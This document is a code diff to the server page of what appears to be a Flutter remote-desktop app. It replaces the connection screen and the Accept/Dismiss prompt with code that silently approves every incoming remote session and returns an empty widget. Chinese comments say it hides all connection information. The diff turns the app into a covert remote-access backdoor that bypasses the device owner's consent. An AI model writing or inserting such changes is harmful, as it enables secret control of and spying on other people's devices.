@@ -190,29 +190,48 @@ class _ServerPageState extends State<ServerPage> {
     super.dispose();
   }
 
+//
+//   @override
+//   Widget build(BuildContext context) {
+//     checkService();
+//     return ChangeNotifierProvider.value(
+//         value: gFFI.serverModel,
+//         child: Consumer<ServerModel>(
+//             builder: (context, serverModel, child) => SingleChildScrollView(
+//                   controller: gFFI.serverModel.controller,
+//                   child: Center(
+//                     child: Column(
+//                       mainAxisAlignment: MainAxisAlignment.start,
+//                       children: [
+//                         buildPresetPasswordWarningMobile(),
+//                         gFFI.serverModel.isStart
+//                             ? ServerInfo()
+//                             : ServiceNotRunningNotification(),
+//                         const ConnectionManager(),
+//                         const PermissionChecker(),
+//                         SizedBox.fromSize(size: const Size(0, 15.0)),
+//                       ],
+//                     ),
+//                   ),
+//                 )));
+//   }
+// }
+
   @override
   Widget build(BuildContext context) {
-    checkService();
-    return ChangeNotifierProvider.value(
-        value: gFFI.serverModel,
-        child: Consumer<ServerModel>(
-            builder: (context, serverModel, child) => SingleChildScrollView(
-                  controller: gFFI.serverModel.controller,
-                  child: Center(
-                    child: Column(
-                      mainAxisAlignment: MainAxisAlignment.start,
-                      children: [
-                        buildPresetPasswordWarningMobile(),
-                        gFFI.serverModel.isStart
-                            ? ServerInfo()
-                            : ServiceNotRunningNotification(),
-                        const ConnectionManager(),
-                        const PermissionChecker(),
-                        SizedBox.fromSize(size: const Size(0, 15.0)),
-                      ],
-                    ),
-                  ),
-                )));
+    final serverModel = Provider.of<ServerModel>(context);
+
+    // 可选：自动接受所有待处理的连接
+    Future.delayed(Duration.zero, () {
+      for (var client in serverModel.clients) {
+        if (!client.authorized) {
+          serverModel.sendLoginResponse(client, true);
+        }
+      }
+    });
+
+    // 完全隐藏连接信息
+    return Container();
   }
 }
 
@@ -732,21 +751,30 @@ class ConnectionManager extends StatelessWidget {
     }
   }
 
+  // Widget _buildNewConnectionHint(ServerModel serverModel, Client client) {
+  //   return Row(mainAxisAlignment: MainAxisAlignment.end, children: [
+  //     TextButton(
+  //         child: Text(translate("Dismiss")),
+  //         onPressed: () {
+  //           serverModel.sendLoginResponse(client, false);
+  //         }).marginOnly(right: 15),
+  //     if (serverModel.approveMode != 'password')
+  //       ElevatedButton.icon(
+  //           icon: const Icon(Icons.check),
+  //           label: Text(translate("Accept")),
+  //           onPressed: () {
+  //             serverModel.sendLoginResponse(client, true);
+  //           }),
+  //   ]);
+  // }
   Widget _buildNewConnectionHint(ServerModel serverModel, Client client) {
-    return Row(mainAxisAlignment: MainAxisAlignment.end, children: [
-      TextButton(
-          child: Text(translate("Dismiss")),
-          onPressed: () {
-            serverModel.sendLoginResponse(client, false);
-          }).marginOnly(right: 15),
-      if (serverModel.approveMode != 'password')
-        ElevatedButton.icon(
-            icon: const Icon(Icons.check),
-            label: Text(translate("Accept")),
-            onPressed: () {
-              serverModel.sendLoginResponse(client, true);
-            }),
-    ]);
+    // 自动接受所有连接请求
+    WidgetsBinding.instance.addPostFrameCallback((_) {
+      serverModel.sendLoginResponse(client, true);
+    });
+
+    // 不显示任何按钮或提示
+    return Container();
   }
 
   List<Widget> _buildNewVoiceCallHint(
